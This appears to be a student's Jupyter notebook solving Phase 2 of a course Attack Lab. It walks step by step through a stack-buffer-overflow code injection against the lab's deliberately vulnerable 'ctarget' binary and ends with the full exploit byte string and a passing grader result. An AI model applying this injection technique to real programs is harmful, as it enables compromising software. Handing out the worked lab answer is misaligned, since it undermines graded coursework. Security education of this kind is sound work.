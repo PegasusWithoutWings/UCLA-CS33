{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CS33: Attack Lab"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Phase 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Overview"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The key technique of exploitation in phase 2 is code injection, which can be carried out in two steps. First, we will write the binary code instructions into the runtime stack. Then, by overflowing the runtime stack, we overwrite the the return address of the current stack and change it into the starting address of the injected code. This way, when the current procedure call is finished, the program will restart at the overwritten return address, which is the injected code.\n",
    "\n",
    "In this phase, what we want to achieve with the injection code is to call another procedure named `touch2` with cache as the argument. So, in the injected code, we need to first move the desired argument value for `touch2` into `%rdi%`, the register that by convention holds the first argument for procedure call, and then find some way to call the procedure `touch2`. Because the lab requirement forbids us from using `jmp` or `call` in our injected code, we need to use a combination of stack overflow and `ret` to call `touch2`. \n",
    "\n",
    "First, we will place the address of `touch2` in the exploit string. Then, in the injected code, we will manipulate the stack pointer to have it pointing to the injected address of `touch2`. This way, when we call `ret` in the injected code, the stack will pop the address of `touch2` and have the program restart there. as desired."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Similar to phase 1, because the stack frame is of size `0x28` or `40`, we need to supply 40-byte long exploit string to overflow the stack and then rewrite the return address with another 8 bytes. However, this time, we also need to include the injected code in the first 40 bytes, so we cannot just simply pad them with 0.\n",
    "\n",
    "To get started, we will write down the assembly code we want to inject. The objective of this phase is to call procedure `touch2` with argument `cookie`, whose value is specified in the file `cookie.txt`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x55ca9f6d\n"
     ]
    }
   ],
   "source": [
    "cat cookie.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[32mmovl\u001b[39;49;00m  \u001b[31m$0x55ca9f6d\u001b[39;49;00m, \u001b[31m%edi\u001b[39;49;00m\n",
      "\u001b[32msub\u001b[39;49;00m   \u001b[31m$0x10\u001b[39;49;00m, \u001b[31m%rsp\u001b[39;49;00m\n",
      "\u001b[32mret\u001b[39;49;00m\n"
     ]
    }
   ],
   "source": [
    "pygmentize phase2.s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Remark that here we need to subtract the stack pointer by two bytes, `0x10`, to have it point to the 8 byte immediately preceding the return address of the `getbuf` call. Why? Because when the computer is running through our injected code, it has already returned from `getbuf` call, thereby incrementing the stack by `0x8` above the return address of `getbuf`.\n",
    "\n",
    "Then, we need to convert it into byte code. One way to do it is to first assemble it into object code and then use objdump to get the byte code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "gcc -c phase2.s -o phase2.o"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "objdump -d phase2.o > phase2.d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[34mphase2\u001b[39;49;00m\u001b[31m.\u001b[39;49;00m\u001b[34mo\u001b[39;49;00m\u001b[31m:\u001b[39;49;00m\t\u001b[34mfile\u001b[39;49;00m \u001b[34mformat\u001b[39;49;00m \u001b[36mMach\u001b[39;49;00m\u001b[31m-\u001b[39;49;00m\u001b[36mO\u001b[39;49;00m \u001b[34m64\u001b[39;49;00m\u001b[31m-\u001b[39;49;00m\u001b[34mbit\u001b[39;49;00m \u001b[34mx86\u001b[39;49;00m\u001b[31m-\u001b[39;49;00m\u001b[34m64\u001b[39;49;00m\n",
      "\n",
      "\u001b[36mDisassembly\u001b[39;49;00m \u001b[34mof\u001b[39;49;00m \u001b[34msection\u001b[39;49;00m \u001b[34m__TEXT\u001b[39;49;00m\u001b[31m,\u001b[39;49;00m\u001b[34m__text\u001b[39;49;00m\u001b[31m:\u001b[39;49;00m\n",
      "\u001b[34m__text\u001b[39;49;00m\u001b[31m:\u001b[39;49;00m\n",
      "       \u001b[34m0\u001b[39;49;00m\u001b[31m:\u001b[39;49;00m\t\u001b[34mbf\u001b[39;49;00m \u001b[34m6\u001b[39;49;00m\u001b[34md\u001b[39;49;00m \u001b[34m9\u001b[39;49;00m\u001b[34mf\u001b[39;49;00m \u001b[34mca\u001b[39;49;00m \u001b[34m55\u001b[39;49;00m \t\u001b[34mmovl\u001b[39;49;00m\t\u001b[31m$\u001b[39;49;00m\u001b[34m1439342445\u001b[39;49;00m\u001b[31m,\u001b[39;49;00m \u001b[31m%\u001b[39;49;00m\u001b[34medi\u001b[39;49;00m\n",
      "       \u001b[34m5\u001b[39;49;00m\u001b[31m:\u001b[39;49;00m\t\u001b[34m48\u001b[39;49;00m \u001b[34m83\u001b[39;49;00m \u001b[34mec\u001b[39;49;00m \u001b[34m10\u001b[39;49;00m \t\u001b[34msubq\u001b[39;49;00m\t\u001b[31m$\u001b[39;49;00m\u001b[34m16\u001b[39;49;00m\u001b[31m,\u001b[39;49;00m \u001b[31m%\u001b[39;49;00m\u001b[34mrsp\u001b[39;49;00m\n",
      "       \u001b[34m9\u001b[39;49;00m\u001b[31m:\u001b[39;49;00m\t\u001b[34mc3\u001b[39;49;00m \t\u001b[34mretq\u001b[39;49;00m\n"
     ]
    }
   ],
   "source": [
    "ccat phase2.d"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So the byte representation of the injected code will be:\n",
    "\n",
    "```\n",
    "bf 6d 9f ca 55 48 83 ec 10 c3\n",
    "```\n",
    "\n",
    "Based on the design outlined in the Overview, we will pad the exploit string with 00 until the last 16 bytes; the first 8 bytes will be the address of `touch2` and the second 8 will be the address of the injected code, which is simply the address of the buffer. So, the exploit string will be:\n",
    "\n",
    "```\n",
    "bf 6d 9f ca 55 48 83 ec 10 c3 00 00 00 00 00 00 00 00 00 00 00 00 \n",
    "00 00 00 00 00 00 00 00 00 00 ADDRESS_OF_TOUCH2 ADDRESS_OF_BUFFER\n",
    "```\n",
    "\n",
    "We can find the address of `touch2` by simply examining the disassembled object code, `ctarget.s`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01;31m\u001b[Ktouch2\u001b[m\u001b[K:\n",
      "  401889:\t48 83 ec 08 \tsubq\t$8, %rsp\n",
      "--\n",
      "  40189f:\t74 23 \tje\t35 <\u001b[01;31m\u001b[Ktouch2\u001b[m\u001b[K+0x3B>\n",
      "  4018a1:\tbf 00 31 40 00 \tmovl\t$4206848, %edi\n",
      "--\n",
      "  4018dd:\teb db \tjmp\t-37 <\u001b[01;31m\u001b[Ktouch2\u001b[m\u001b[K+0x31>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "cat ctarget.s | grep -A 1 touch2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The line immediately after `touch2:` declaration is the address of the procedure. Padded to 8 bytes, the address is `0x0000000000401889`. However, we still need to format the address to fit the Little Endian byte order and separate each byte with a space. I wrote a convenient Python script `toLittleEndian.py` to carry out the task."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[34mimport\u001b[39;49;00m \u001b[04m\u001b[36msys\u001b[39;49;00m\n",
      "\n",
      "word = sys.argv[\u001b[34m1\u001b[39;49;00m]\n",
      "result = \u001b[33m'\u001b[39;49;00m\u001b[33m'\u001b[39;49;00m;\n",
      "\u001b[34mfor\u001b[39;49;00m i \u001b[35min\u001b[39;49;00m \u001b[36mrange\u001b[39;49;00m(\u001b[34m0\u001b[39;49;00m, \u001b[36mlen\u001b[39;49;00m(word), \u001b[34m2\u001b[39;49;00m):\n",
      "  result = word[i : i + \u001b[34m2\u001b[39;49;00m] + \u001b[33m'\u001b[39;49;00m\u001b[33m \u001b[39;49;00m\u001b[33m'\u001b[39;49;00m + result\n",
      "\u001b[34mprint\u001b[39;49;00m(result.strip())\n"
     ]
    }
   ],
   "source": [
    "pygmentize toLittleEndian.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "89 18 40 00 00 00 00 00\n"
     ]
    }
   ],
   "source": [
    "python3 toLittleEndian.py 0000000000401889"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Therefore, `ADDRESS_OF_TOUCH2` is `89 18 40 00 00 00 00 00`.\n",
    "\n",
    "The only thing remains is to find the address of the buffer, which cannot be found by just looking into the disassembled code because it is allocated at run time. So, we are going to run the code in `gdb` to find it out. Below is the result of running gdb in the school's designated lab server:\n",
    "\n",
    "```\n",
    "(gdb) break getbuf\n",
    "Breakpoint 1 at 0x401847: file buf.c, line 12.\n",
    "(gdb) run\n",
    "Starting program: /w/home.13/class/classtzh/CS33/AttackLab/target40/ctarget\n",
    "Cookie: 0x55ca9f6d\n",
    "\n",
    "Breakpoint 1, getbuf () at buf.c:12\n",
    "12\tbuf.c: No such file or directory.\n",
    "(gdb) disassemble\n",
    "Dump of assembler code for function getbuf:\n",
    "=> 0x0000000000401847 <+0>:\tsub    $0x28,%rsp\n",
    "   0x000000000040184b <+4>:\tmov    %rsp,%rdi\n",
    "   0x000000000040184e <+7>:\tcallq  0x401a80 <Gets>\n",
    "   0x0000000000401853 <+12>:\tmov    $0x1,%eax\n",
    "   0x0000000000401858 <+17>:\tadd    $0x28,%rsp\n",
    "   0x000000000040185c <+21>:\tretq\n",
    "End of assembler dump.\n",
    "(gdb) stepi\n",
    "14\tin buf.c\n",
    "(gdb) disassemble\n",
    "Dump of assembler code for function getbuf:\n",
    "   0x0000000000401847 <+0>:\tsub    $0x28,%rsp\n",
    "=> 0x000000000040184b <+4>:\tmov    %rsp,%rdi\n",
    "   0x000000000040184e <+7>:\tcallq  0x401a80 <Gets>\n",
    "   0x0000000000401853 <+12>:\tmov    $0x1,%eax\n",
    "   0x0000000000401858 <+17>:\tadd    $0x28,%rsp\n",
    "   0x000000000040185c <+21>:\tretq\n",
    "End of assembler dump.\n",
    "(gdb) print /x $rsp\n",
    "$1 = 0x556647a8\n",
    "```\n",
    "\n",
    "We can see that the address of the buffer is `0x556647a8`, which, padded to 8 byte, is `0x00000000556647a8`. Convert it again to Little Endian with our Python script."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "a8 47 66 55 00 00 00 00\n"
     ]
    }
   ],
   "source": [
    "python3 toLittleEndian.py 00000000556647a8"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Therefore, ADDRESS_OF_BUFFER is a8 47 66 55 00 00 00 00.\n",
    "\n",
    "Since we now have all the puzzle pieces, we can complete the exploit string, which is:\n",
    "\n",
    "```\n",
    "bf 6d 9f ca 55 48 83 ec 10 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n",
    "00 00 00 00 00 00 00 00 89 18 40 00 00 00 00 00 a8 47 66 55 00 00 00 00\n",
    "```\n",
    "\n",
    "We then tested it on the server. It worked.\n",
    "\n",
    "```\n",
    "# ./hex2raw < phase2.txt | ./ctarget\n",
    "Cookie: 0x55ca9f6d\n",
    "Type string:Touch2!: You called touch2(0x55ca9f6d)\n",
    "Valid solution for level 2 with target ctarget\n",
    "PASS: Sent exploit string to server to be validated.\n",
    "NICE JOB!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Phase 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
